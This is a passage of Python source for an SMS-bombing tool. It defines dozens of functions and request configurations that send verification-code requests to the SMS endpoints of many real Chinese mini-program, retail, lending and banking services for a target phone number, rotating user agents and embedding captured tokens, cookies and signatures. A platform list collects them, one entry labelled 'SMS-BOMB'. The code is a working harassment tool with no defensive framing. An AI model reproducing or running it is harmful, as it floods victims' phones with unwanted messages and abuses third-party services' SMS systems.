    return requests.get(url, headers=headers).text

# 新增8个平台函数（修正时间戳，保留原始参数）
def send_leyue_sms(mobile):
    """LEYUE 平台短信验证码接口（微信小程序）"""
    # 保留原URL中的固定时间戳 1767541150000
    url = f"https://online.cins.leyue100.com/gateway/ms-claim-c/user/getCode?phone={mobile}&type=1&timestamp=1767541150000"
    headers = {
        'User-Agent': random_user_agent(),
        'token': "user_login:20260104_1mrjgzhwhuta2",
        'channel': "leyue",
        'ver': "1.3.4",
        'source': "wechat-mini",
        'content-type': "application/json; charset=UTF-8",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wxa6cea81f2687e9e2/185/page-frame.html"
    }
    return requests.get(url, headers=headers).text

def send_ylbtl_sms(mobile):
    """YLBTL 平台短信验证码接口（微信小程序）"""
    url = f"https://zpmxcx.ylbtl.cn/api/app/getCode?phone={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'content-type': "application/json",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx562c1a4683c1cc51/63/page-frame.html"
    }
    return requests.get(url, headers=headers).text

def send_renlibao_sms(mobile):
    """RENLIBao 平台短信验证码接口（微信小程序）"""
    url = f"https://zb.renlibao.cn/zhongChuang/sendSmsCode2?phone={mobile}&encipherStr=KdKoVPKNS5G2TFfz72EHKw%3D%3D"
    headers = {
        'User-Agent': random_user_agent(),
        'content-type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxdb371b9bb17b0253/9/page-frame.html",
        'Cookie': "acw_tc=ac11000117675396696102837e462e846874cb75ba2131bd46612486d8cc2f"
    }
    return requests.get(url, headers=headers).text

def send_dxueshi_sms(mobile):
    """DXUESHI 平台短信验证码接口（微信小程序）"""
    url = "https://crmapi.dxueshi.com/v1/user/send-code"
    headers = {
        "Host": "crmapi.dxueshi.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxe9e83bd839e91fcf/279/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = f"""{{"phoneNum":"{mobile}"}}"""  # 嵌套双引号转义
    return requests.post(url, headers=headers, data=data).text

def send_shouchadou_sms(mobile):
    """SHOUCHADOU 平台短信验证码接口（微信小程序）"""
    url = f"https://admin.shouchadou.cn/scd/app/login/sendMessage?phone={mobile}&type=1"
    headers = {
        "Host": "admin.shouchadou.cn",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx52a8cec9f573eb47/10/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.post(url, headers=headers).text

def send_56hello_sms(mobile):
    """56HELLO 平台短信验证码接口（微信小程序）"""
    url = "https://wx-api.56hello.com/api/wxpaotuiqishou/login/code/send"
    headers = {
        "Host": "wx-api.56hello.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "wx-user-token": "",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx31cede4138e3b01b/12/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = f"""{{"mobile":"{mobile}"}}"""
    return requests.post(url, headers=headers, data=data).text

def send_wandaloans_sms(mobile):
    """WANDALOANS 平台短信验证码接口（微信小程序）"""
    url = "https://wallet.wandaloans.com/wallet_admin/api/v1/management/validCode/sms"
    headers = {
        "Host": "wallet.wandaloans.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "version": "1.0.2",
        "EncryptCode": "",
        "Accesstoken": "",
        "platform": "MERCHANT_WEIXIN_XCX",
        "Channel": "shd_xcx_05",
        "openid": "",
        "shopId": "",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxf484056816a2ed59/35/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = f"""{{"merchantLongFlag":1,"mobile":"{mobile}"}}"""
    return requests.post(url, headers=headers, data=data).text

def send_yangtianinfo_sms(mobile):
    """YANGTIANINFO 平台短信验证码接口（微信小程序）"""
    url = f"https://zwd.yangtianinfo.cn/api/applet/get/code?phone={mobile}&type=0"
    headers = {
        "Host": "zwd.yangtianinfo.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "token": "[object Null]",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx93a7121473168c82/13/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.get(url, headers=headers).text
def send_susufuture_sms(mobile):
    """SUSUFUTURE 平台短信验证码接口（微信小程序）"""
    url = "https://zzyq.susufuture.com/api/user/getVerificationCode"
    payload = {'phone': mobile}
    headers = {
        'User-Agent': random_user_agent(),
        'minicv': "mini/3.0.57",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx8a6b4bf9e33a41de/16/page-frame.html"
    }
    try:
        return requests.post(url, data=payload, headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

def send_smeservice_sms(mobile):
    """SMESERVICE 平台短信验证码接口（微信小程序）"""
    url = "https://www.smeservice.com/wx-xcx/rxapi/sys/captcha/api/generate/smsCaptcha"
    params = {'phone': mobile}
    payload = {}
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx6cbc7381c7b33d2f/74/page-frame.html"
    }
    try:
        return requests.post(url, params=params, data=json.dumps(payload), headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

def send_hkankan_sms(mobile):
    """HKANKAN 平台短信验证码接口（微信小程序）"""
    url = "https://79yy.hkankan.cn/api/index/get_yzm"
    payload = {"phone": mobile}
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'token': "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIyMDFhYWFhYWFhYWFhYWFhYWFhYWFhYSIsImF1ZCI6IiIsImlhdCI6MTc2NzY2MzM4NywibmJmIjoxNzY3NjYzMzkwLCJleHAiOjE3Njc3MDY1ODcsImRhdGEiOnsidWlkIjozMjQxfX0.I9d0wmzckxPjF3KfCM14CeVQVKlbKOsgYeq85R0yDjo",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx872b66e76d595e59/7/page-frame.html",
        'Cookie': "ssid=8a626b97200cc60fb36e0b8870e749be; lang=zh-cn"
    }
    try:
        return requests.post(url, data=json.dumps(payload), headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

def send_rrzuji_sms(mobile):
    """RRZUJI 平台短信验证码接口（微信小程序）"""
    url = "https://m.rrzuji.com/codeali/wx-mini/phone-code?merch_id=&mini_from=credit_wx&app_shop_id=&app_tmp_id=19&app_id=wx45fe4cb14833fb1a"
    payload = {
        'phone': mobile,
        'auth_code': "0c1CM510008QDV1gMn200EdgfD1CM51l"  # 注意：auth_code为固定值，若需动态生成需额外处理
    }
    headers = {
        'User-Agent': random_user_agent(),
        'Authorization': "176765546594ec21b93bbe1031b81a7ec71a89d1885391904264249267",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx45fe4cb14833fb1a/4/page-frame.html",
        'Cookie': "aliyungf_tc=6534fb4018f0747119a4b1a107043b29fac450441a08c3c8f8dc650a9e78dd00; canary-route=\"d1d9e7922fbf27f0\"; acw_tc=202fa6c7-e0b7-4a04-9de5-03f7f0bd33609cc754c0c320c050f526c8f1106dc025"
    }
    try:
        return requests.post(url, data=payload, headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

def send_corpbay_sms(mobile):
    """CORPBAY 平台短信验证码接口（微信小程序）"""
    url = f"https://server.mini.corpbay.com/customer/auth/ticket/seed?mobile={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'content-type': "application/x-www-form-urlencoded",
        'auth_token': "[object Undefined]",
        'origintype': "1",
        'originfrom': "mini",
        'userid': "[object Undefined]",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wxe5b0cf2e27c4df8f/145/page-frame.html"
    }
    try:
        return requests.get(url, headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

def send_zjrcbank_sms(mobile):
    """ZJRCBANK 平台短信验证码接口（微信小程序）"""
    url = "https://rcp.zjrcbank.com:8970/api/c/sms/validate"
    payload = {
        "openId": "小玮",  # 注意：openId为固定值，若需动态生成需额外处理
        "orgNo": "1",
        "mobile": mobile
    }
    headers = {
        'Host': "rcp.zjrcbank.com:8970",
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'token': "",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx0c0596cc028df48f/88/page-frame.html"
    }
    try:
        return requests.post(url, data=json.dumps(payload), headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

def send_56yzm_sms(mobile):
    """56YZM 平台短信验证码接口（微信小程序）"""
    url = "https://htms-app.56yzm.com/minifreight/user/new/getOldMobileVerificationCode"
    payload = {"oldMobile": mobile}
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'appId': "wxb0a6deb61930a1dd",
        'zoken': "1136735bdc9cb6298e1b22fa1e110f43",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxb0a6deb61930a1dd/28/page-frame.html"
    }
    try:
        return requests.post(url, data=json.dumps(payload), headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"

# ==================== 原有函数（示例，需保留项目中原有函数） ====================
def send_yangtianinfo_sms(mobile):
    """YANGTIANINFO 平台短信验证码接口（微信小程序）"""
    url = f"https://zwd.yangtianinfo.cn/api/applet/get/code?phone={mobile}&type=0"
    headers = {
        "Host": "zwd.yangtianinfo.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "token": "[object Null]",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx93a7121473168c82/13/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    try:
        return requests.get(url, headers=headers).text
    except Exception as e:
        return f"Request failed: {str(e)}"    
# ==================== 最终平台列表（含所有新增平台） ====================
PLATFORMS = [
    ("CCSGAGZC", send_ccsgagzc),
    ("BIMART", send_bimart),
    ("HYRENLI", send_hyrenli),
    ("SNCA", send_snca),
    ("HONGJINZHI", send_hongjinzhi),
    ("ZSBL", send_zsbl),
    ("SMS-BOMB", send_sms_bomb),
    ("LINLONGYUN", send_linlongyun),
    ("SHIBAO", send_shibao),
    ("OLO", send_olo),
    ("ISIGNET", send_isignet),
    ("SHENGSHIMINSHANG1", send_shengshiminshang1),
    ("SHENGSHIMINSHANG2", send_shengshiminshang2),
    ("CHAILEASE", send_chailease),
    ("ANJI-LEASING", send_anji_leasing),
    ("ZHONGDAWULIAN", send_zhongdawulian),
    ("INTERHOS", send_interhos),
    ("FIREBOOK", send_firebook),
    ("AIFLOWERS", send_aiflowers),
    ("SCBJZ", send_scbjz),
    ("YXH_HNHUI", send_yxh_hnhui),
    ("YUNQIDAI", send_yunqidai),
    ("APIFOX_YUNQIDAI", send_apifox_yunqidai),
    ("DONGGUDI", send_donggudi),
    ("YINGMI", send_yingmi_sms),
    ("QHWFTPA", send_qhwftpa_sms),
    # 新增平台
    ("BAOER", send_baoer_sms),
    ("FCA-GROUP-AFC", send_fcagroupafc_sms),
    ("SHISHIER", send_shishier_sms),
    ("TAXLL", send_taxll_sms),
    ("LESSO", send_lesso_sms),
    ("YOUJIAYUN", send_youjiayun_sms),
    ("SENQIANG", send_senqiang_sms),
    ("CQSME", send_cqsme_sms),
    ("LEYUE", send_leyue_sms),
    ("YLBTL", send_ylbtl_sms),
    ("RENLIBao", send_renlibao_sms),
    ("DXUESHI", send_dxueshi_sms),
    ("SHOUCHADOU", send_shouchadou_sms),
    ("56HELLO", send_56hello_sms),
    ("WANDALOANS", send_wandaloans_sms),
    ("YANGTIANINFO", send_yangtianinfo_sms),
    ("SUSUFUTURE", send_susufuture_sms),
    ("SMESERVICE", send_smeservice_sms),
    ("HKANKAN", send_hkankan_sms),
    ("RRZUJI", send_rrzuji_sms),
    ("CORPBAY", send_corpbay_sms),
    ("ZJRCBANK", send_zjrcbank_sms),
    ("56YZM", send_56yzm_sms)
]


# ------------------ 辅助函数 ------------------
def random_id(length=19):
    return ''.join(random.choices('0123456789', k=length))

def random_uuid():
    return str(uuid.uuid4())

def random_hex_32():
    return binascii.hexlify(os.urandom(16)).decode()

def random_str_40plus(min_length=40):
    length = random.randint(min_length, min_length + 10)
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def random_str(length=32):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_msg_digest():
    return ''.join(random.choices('abcdef0123456789', k=32))

def generate_requests_config(phone):
    """生成分钟接口配置列表（请根据实际接口填充）"""
    timestamp = int(time.time() * 1000)
    current_time = int(time.time())
    msg_digest = generate_msg_digest()

    return [
        # 接口1: renatus.ycdongxu.com
        {
            'name': "renatus.ycdongxu.com",
            'url': "https://renatus.ycdongxu.com/api/v1/send_sms",
            'method': 'POST',
            'json_data': {"mobile": phone},
            'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx4e54df0d51f4af35/2/page-frame.html"
            }
        },
        
        # 接口2: jingshun-wl.com
        {
            'name': "jingshun-wl.com",
            'url': "https://www.jingshun-wl.com/index/mainserver/getVcode",
            'method': 'POST',
            'json_data': {
                "mobile": phone,
                "t": timestamp,
                "sign": "2071366d47a154fb0b05056191949bdb"
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx60793c3586f4777f/10/page-frame.html"
            }
        },
        
        # 接口3: jingid.com (第一次)
        {
            'name': "jingid.com-1",
            'url': "https://www.jingid.com/index/Jydserver/getVcode",
            'method': 'POST',
            'json_data': {
                "mobile": phone,
                "t": timestamp,
                "sign": "0a79ab6f0724f5f8d3a5948c50261c87"
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx19bcacf52f922f1e/1/page-frame.html"
            }
        },
        
        # 接口4: jhuishou.com
        {
            'name': "jhuishou.com",
            'url': "https://app.jhuishou.com/ApiV1/index.php",
            'method': 'POST',
            'form_data': {
                'jhs': "checkMobileCode",
                'phone': phone,
                'method': "login",
                'channel': "sapp-wechat"
            },
            'headers': {
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx5d85aade9da7d622/5/page-frame.html"
            }
        },
        
        # 接口5: wokawl.com
        {
            'name': "wokawl.com",
            'url': "https://www.wokawl.com/index/mainserver/getVcode",
            'method': 'POST',
            'json_data': {
                "mobile": phone,
                "t": timestamp,
                "appid": "wx2fe645d022e8b5f8",
                "sign": "bf954b5ff4d4d7f49db58c28b49635c5"
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx2fe645d022e8b5f8/7/page-frame.html"
            }
        },
        
        # 接口6: jinger-wl.com
        {
            'name': "jinger-wl.com",
            'url': "https://www.jinger-wl.com/api/sms/send",
            'method': 'POST',
            'form_data': {
                'mobile': phone,
                'returndatetype': "JSON"
            },
            'headers': {
                'token': "[object Boolean]",
                'lastVersion': "20240403",
                'plat': "mp",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wxf5e7de6a04eeec1b/1/page-frame.html"
            }
        },
        
        # 接口7: yuanzhipca.com (login)
        {
            'name': "yuanzhipca.com-login",
            'url': f"https://aidiscriminatemoney.yuanzhipca.com/AIDiscriminateMoney/api/?action=SendSmsValicode&phone={phone}&where=login&memberId=750551",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'appEnvVersion': "release",
                'appVersion': "2.4.1",
                'appPath': "usercenter/login/index",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx3e49bfea1c5ccb9a/138/page-frame.html"
            }
        },
        
        # 接口8: yuanzhipca.com (yeepayRegist)
        {
            'name': "yuanzhipca.com-yeepayRegist",
            'url': f"https://aidiscriminatemoney.yuanzhipca.com/AIDiscriminateMoney/api/?action=SendSmsValicode&phone={phone}&where=yeepayRegist",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'appEnvVersion': "release",
                'appVersion': "2.4.1",
                'appPath': "usercenter/wallet/yopRegister/index",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx3e49bfea1c5ccb9a/138/page-frame.html"
            }
        },
        
        # 接口9: jingid.com (第二次)
        {
            'name': "jingid.com-2",
            'url': "https://www.jingid.com/index/Jydserver/getVcode",
            'method': 'POST',
            'json_data': {
                "mobile": phone,
                "t": timestamp,
                "sign": "922a8a2357806f3da8859fa3312db4e5"
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxcf36f8dd1ba02f04/4/page-frame.html"
            }
        },
        
        # 接口10: jingxi-wl.com
        {
            'name': "jingxi-wl.com",
            'url': "https://www.jingxi-wl.com//api/sms/send",
            'method': 'POST',
            'form_data': {
                'mobile': phone,
                'type': "regCaptcha",
                'returndatetype': "JSON"
            },
            'headers': {
                'token': "[object Undefined]",
                'systeminfo': "{\"appId\":\"__UNI__E8D904B\",\"appName\":\"www\",\"appVersion\":\"20250703\",\"deviceModel \":\"PJE110\",\"osName\":\"android\",\"osVersion\":\"15\",\"uniPlatform\":\"mp-weixin\",\"deviceId\":\"17522750026533095201\"}",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxc3101481596a072a/18/page-frame.html"
            }
        },
        
        # 接口11: jhzh66.com
        {
            'name': "jhzh66.com",
            'url': "https://shop.jhzh66.com/api/ajax/send_code",
            'method': 'POST',
            'json_data': {"mobile": phone},
            'headers': {
                'Content-Type': "application/json",
                'authorization': "",
                'oppl': "RECXCX",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx917f69122a336cf5/152/page-frame.html"
            }
        },
        
        # 接口12: youqum.com
        {
            'name': "youqum.com",
            'url': "https://e.youqum.com/api/sms/send",
            'method': 'POST',
            'json_data': {"mobile": phone, "event": "register"},
            'headers': {
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'sec-ch-ua-platform': "\"Android\"",
                'Authorization': "",
                'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
                'content-type': "application/json;",
                'sec-ch-ua-mobile': "?1",
                'Origin': "https://e.youqum.com",
                'X-Requested-With': "com.tencent.mm",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': "https://e.youqum.com/",
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': "_c_WBKFRo=x6uaGyC2Sw9pZiemc8yPLuIR1jn7Wy3EkW17ReXB; _nb_ioWEgULi=; PHPSESSID=" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
            }
        },
        
        # 接口13: hema.outer.ekeli.cn
        {
            'name': "hema.outer.ekeli.cn",
            'url': "https://hema.outer.ekeli.cn/api/Users.User/sendSms",
            'method': 'POST',
            'json_data': {"mobile": phone},
            'headers': {
                'Content-Type': "application/json",
                'content-type': "application/json;charset=UTF-8",
                'authorization': "",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx9eeebe3f3d7de213/47/page-frame.html"
            }
        },
        
        # 接口14: xiaojianke99.com
        {
            'name': "xiaojianke99.com",
            'url': f"https://api.xiaojianke99.com/passport/mobcodeforlogin/?WZSignTime={current_time}&_sign=a2272a2d78a5ccd1adc7a3905a493c59&_verify=&_uid=0&_version=w.1.1.184&_did=sHmlfKKhduneIaYYpPDQRayJsa4BT06n&mobile={phone}",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx41743eabe6adbd64/88/page-frame.html"
            }
        },
        
        # 接口15: kongfz.com
        {
            'name': "kongfz.com",
            'url': f"https://login.kongfz.com/Miniprogram/Ajax/sendMobileCheckCodeByQuickBuy?mobile={phone}",
            'method': 'GET',
            'headers': {
                'content-type': "application/x-www-form-urlencoded",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx7d41475380ee2b65/5/page-frame.html",
                'Cookie': f"client=miniprogram;utmSource=;uuid={random_uuid()};"
            }
        },
        
        # 接口16: kaiqiuwang.cc
        {
            'name': "kaiqiuwang.cc",
            'url': f"https://kaiqiuwang.cc/xcx/public/index.php//api/publicc/send_code?mobile={phone}&username=%E6%98%9F%E9%A3%9E%E5%B8%86&randomStr={random_hex_32()}",
            'method': 'GET',
            'headers': {
                'token': "",
                'xx-device-type': "wxapp",
                'content-type': "application/x-www-form-urlencoded",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxff09fb0e92aa456a/412/page-frame.html"
            }
        },
        
        # 接口17: duoyundong.yoger.cn
        {
            'name': "duoyundong.yoger.cn",
            'url': "https://duoyundong.yoger.cn/duoapp/sendcode.php",
            'method': 'POST',
            'form_data': {
                'client': "xcx",
                'ver': "25052101",
                'member_id': "",
                'key': "",
                'uuid': random_str_40plus(40),
                'type': "send",
                'member_phone': phone
            },
            'headers': {
                'Accept': "",
                'api-version': "V1",
                'x-api-key': "YgXcx",
                'x-requested-with': "XMLHttpRequest",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxc246f46620f5dc01/158/page-frame.html"
            }
        },
        
        # 接口18: rec-api.boolv.com
        {
            'name': "rec-api.boolv.com",
            'url': f"https://rec-api.boolv.com/api/util/send_sms_validcodenew/{phone}?plat=personal-xcx",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'authorization': "Bearer " + random_str_40plus(120),
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wx2ce03f6ce299c3a4/64/page-frame.html"
            }
        },
        
        # 接口19: aifenlei.com.cn
        {
            'name': "aifenlei.com.cn",
            'url': f"https://mn.aifenlei.com.cn/business/sendValidate?token=&mobile={phone}",
            'method': 'GET',
            'headers': {
                'content-type': "application/json",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx203513130025d9e6/592/page-frame.html"
            }
        },
        
        # 接口20: passport-api.tujia.com
        {
            'name': "passport-api.tujia.com",
            'url': f"https://passport-api.tujia.com/captcha/sendSmsCode?_fasTraceId={int(time.time()*1000)}Hmt9Fndt_8ZREcGHjZTccZ1fyKjRXbwPnX8ZP_akW7ptF28k02",
            'method': 'POST',
            'json_data': {
                "parameter": {
                    "mobile": phone,
                    "bizCode": 30,
                    "countryCode": "86"
                }
            },
            'headers': {
                'Content-Type': "application/json",
                'userId': "",
                'userToken': "",
                'openId': "owfHr0F9mZADIlLeql8UnWcDI_ws",
                'mpVersion': "7",
                'storeGuid': "",
                'wrapperId': "wapmyapplet",
                'uid': f"e960198f-2e2b-4698-9d1b-5fd149d7d7f4-{int(time.time()*1000)}",
                'X-TJP': "30",
                'X-TJTS': str(int(time.time())),
                'X-TJH': "42d81964c49e0c59bbdb39d41b77ccdf1e46634a",
                'X-TJCH': "0",
                'LL-INFO': "wprDtcOLwqEDTQ5Tw70CwrvDvGPDvRIcwrXCm8KjKB9VC1HDqsKJw6tsa8K5VsOCw4g7K8Oww6AJeFlyAn9GwoRMwqwjYcKhwo0Vw7vDusOxKsODP8OOw7fCg8O8wosyA1fCnC3CusO4FCfDsMOaw7PClSfDswtbw6Ilwr3Dp8OFYMOlQsOAZ0/DlMOOwqjCrMOfwqkIw5/CiiM8wr50KsKWQ8KRw6JsWgU7w4rDgsKdAcKDXxDDu8K/wrnDksKlw7HCmAnDl8OgwqzDm8OFcMODw6/CkxU1w4PCuMKdw63DiSLCiiw+woHDpcOSfSkxbxjDsQfCqmQ+wpbCp8OZWMKFVsO5QsOZw5IcwrBxw4HCi8O9RiEIBg/CpwXCv8OLM8KZfMORwoNpw5/CjFkow5rDgsOEw6TCiQpSDMKcw7ZkwpjCncKFwpTCvTvCo8KLw6Ygw5vDrMOvOGxUScKHw7lpHB3CpXTDoMOjG8KdVQ==",
                'T-INFO': "d4f6a00271d4fc1e21a8eb9a40b9a6d74ddde689666bec55d7544620a24e3bf8dea3d8e6b4e72f5076e45337e696f623ef5a9e8564eac133d71747aezL4aYHrh53+oovzAy+PiZO4lTTZYeWylFiTejY6ZS+301+MURo+FMGSMhGhHvFmhDCTPC+SdYF1iT6WfmVSnQA+VdK1ZAg==",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wxe1845d5fa4e3659f/127/page-frame.html",
                'Cookie': "tujia.com_PortalContext_UserId=;tujia.com_PortalContext_UserToken="
            }
        },
        
        # 接口21: ikea.cn (宜家)
        {
            'name': "ikea.cn",
            'url': "https://bff.app.ikea.cn/crbff/idaas/api/bff/v1.2/developer/ciam/sms_verification/obtain_code_v2",
            'method': 'POST',
            'json_data': {
                "fid": "6f2b3604-75b1-3be0-872c-220c8182fd7d",
                "phoneNumber": phone,
                "challenge": "bdb8bb668233fb800054e5a764c32f23",
                "seccode": "52143fe8d4858459fb5722008fbd0641|jordan",
                "validate": "52143fe8d4858459fb5722008fbd0641"
            },
            'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'x-client-platform': "WechatMiniprogram",
                'x-client-version': "4.51.1",
                'x-client-devicemodel': "PJE110",
                'x-client-deviceid': "oPq0d5CDKbpy2cG8lYdLh4k9ZKk8",
                'x-client-sessionid': "42f76cef5608-4281-8dcc-aa9fee3da015",
                'content-type': "application/json; charset=UTF-8",
                'source': "SHOPPABLE_MINI_P",
                'x-trace-tag-correlationid': "8aa1b381966e929382de3b13eeff117594b2eb2bd19a8fbbff6395bcc3bd8c03",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxd47892129d2fa9e9/278/page-frame.html"
            }
        },
        
        # 接口22: chowsangsang.com.cn (周大福)
        {
            'name': "chowsangsang.com.cn",
            'url': "https://cssecapiprod.chowsangsang.com.cn/account/sendSMS",
            'method': 'POST',
            'form_data': {
                'openid': "eyJpdiI6InJwXC9oVGRSaXdjck01bnI5Zll4bmJ3PT0iLCJ2YWx1ZSI6IkZcL2dPQllpSzVNWkhlaGFWc1Q0dDI5UE5lT3cwa29YS0NUczFBM2N5VDAxbWlTR29pQ0dLRGVtZEhlSDdNclpLYlp4V1hiTUhSZW5WXC9KeHJDMnBBSk90TkdnTVo2SWVaU0lnRjBCSFwvb01nQUFBZmJOV2R2THhlM25uZmFmbHVHb001SU5TdzB4NEFhUkVFTEp0ZUlraFFGYTg1VVNLRnU5MXRQSVJmT2lyamFPXC9EV3lCWllXMnF3dlwvbExYVUVrRkRpNVlpXC91XC8yZGtKcHo2VVhBMUU4SVZzSkMzVlVPTTlYM0paWngxNTdjPSIsIm1hYyI6IjkwNDUzYjE0MzkwYzA2MjdlODRmYWM0MDMxMGI1Yzk1M2QxYjdlZGFkNmYzMDg3Y2ZiYTYxZjA2MmQ1Mzc1NTQifQ==",
                'phone': phone,
                'phoneCode': "86"
            },
            'headers': {
                'version': "v2.0",
                'access-token': "3ccfB8ab8NKjP8XZqDNqg2Xq8GYSwUd9",
                'brand-code': "CSS",
                'charset': "utf-8",
                'referer': "https://servicewechat.com/wxf387a3cca85b08fa/210/page-frame.html"
            }
        },
        
        # 接口23: eapi.msxf.com
        {
            'name': "eapi.msxf.com",
            'url': "https://eapi.msxf.com/pub/sms/code/V1/send",
            'method': 'POST',
            'json_data': {
                "mobile": phone,
                "category": "login",
                "apiSource": "commonSmsCode"
            },
            'headers': {
                'Content-Type': "application/json",
                'content-type': "application/json;charset=utf-8",
                'X-Client': "xcxxmhh; ; ; 200061; ; ; ; ; ; ; ; ;",
                'X-API-Version': "2",
                'X-Application-Id': "newzy_xcx",
                'X-Request-Date': "2025-07-12 09:11:26",
                'X-Sign': "25f5118dac573cd643d878dd05fc7a8b",
                'X-Token': "",
                'X-VToken': "",
                'X-Sk-Trans': "yCK0Ce52S3DJifqd3q18msQzcOFvLKJU3ph6LB+onpyzTdrokg+PDxmrolN/JInKXvxv1KWIyK2FFMhMLyBRL0sMADsg/Sj9uFRDF40GLdBhigQHT5pBy91JsZXOepEuIN3OjznqSmH0X6t9xHqJxJXKI9k7b5AT05RCj3bAAYA=",
                'X-APP-Version': "2.3.2",
                'X-Request-id': "G27cdVEPYoDt6oepOCr9ssZZRxwR9w2m",
                'X-BindingId': "ora8T5BrMos6QGy4RRLd-GMJdDEI",
                'X-Remote-Ip': "",
                'X-AfClientId': "",
                'X-CNDSa-AnonymousId': "Athg0nO9L4gC5/jvibGc/g==",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wxd9e67c883d24ee4f/106/page-frame.html"
            }
        },
        
        # 接口24: pay.zkeduo.com
        {
            'name': "pay.zkeduo.com",
            'url': "https://pay.zkeduo.com/contract/v1/SmsSend",
            'method': 'POST',
            'json_data': {
                "mobile": phone,
                "use_scene": 50,
                "auth_key": "9aBCq7VTPC9h+LV00ymPQTYyHG9xiUQqi+wgb4Km4mA="
            },
            'headers': {
                'Content-Type': "application/json",
                'charset': "utf-8",
                'Referer': "https://servicewechat.com/wx4419636596da8325/25/page-frame.html"
            }
        },
        
        # 接口25: tapi.fangxinqian.cn
        {
            'name': "tapi.fangxinqian.cn",
            'url': "https://tapi.fangxinqian.cn/sponsor/user/send-code",
            'method': 'POST',
            'json_data': {
                "phone": phone,
                "type": "personCheck",
